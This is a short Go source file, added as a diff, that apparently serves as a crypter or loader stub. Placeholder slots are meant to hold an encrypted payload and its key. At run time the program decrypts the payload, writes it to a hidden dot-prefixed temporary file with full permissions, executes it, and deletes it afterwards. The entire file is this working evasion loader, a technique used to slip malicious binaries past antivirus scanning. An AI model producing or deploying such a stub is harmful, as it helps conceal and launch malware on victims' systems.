@@ -1,0 +1,65 @@
+package main
+
+import (
+	"fmt"
+	"io/ioutil"
+	"log"
+	"os"
+	"os/exec"
+	"strconv"
+	"strings"
+
+	"github.com/Grant-Eckstein/everglade"
+)
+
+func recvByteSlice(bs string) []byte {
+	var bb []byte
+	for _, ps := range strings.Split(strings.Trim(bs, "[]"), " ") {
+		pi, _ := strconv.Atoi(ps)
+		bb = append(bb, byte(pi))
+	}
+	return bb
+}
+
+func main() {
+
+	// Read in iv
+	ivStr := fmt.Sprintf("INSERT_IV")
+	iv := recvByteSlice(ivStr)
+
+	// Read in iv
+	ctStr := fmt.Sprintf("INSERT_CT")
+	ct := recvByteSlice(ctStr)
+
+	// Read in everglade export
+	exStr := fmt.Sprintf("INSERT_EXP")
+	exp := recvByteSlice(exStr)
+
+	obj := everglade.Import(exp)
+
+	data := obj.DecryptCBC(iv, ct)
+
+	// Create temp file
+	file, err := ioutil.TempFile(".", ".*")
+	if err != nil {
+		log.Fatal(err)
+	}
+	defer os.Remove(file.Name())
+
+	// Write to file
+	err = os.WriteFile(file.Name(), data, 0777)
+	if err != nil {
+		log.Fatal(err)
+	}
+
+	err = os.Chmod(file.Name(), 0777)
+	if err != nil {
+		log.Fatal(err)
+	}
+
+	err = exec.Command(file.Name()).Run()
+
+	if err != nil {
+		log.Fatal(err)
+	}
+}
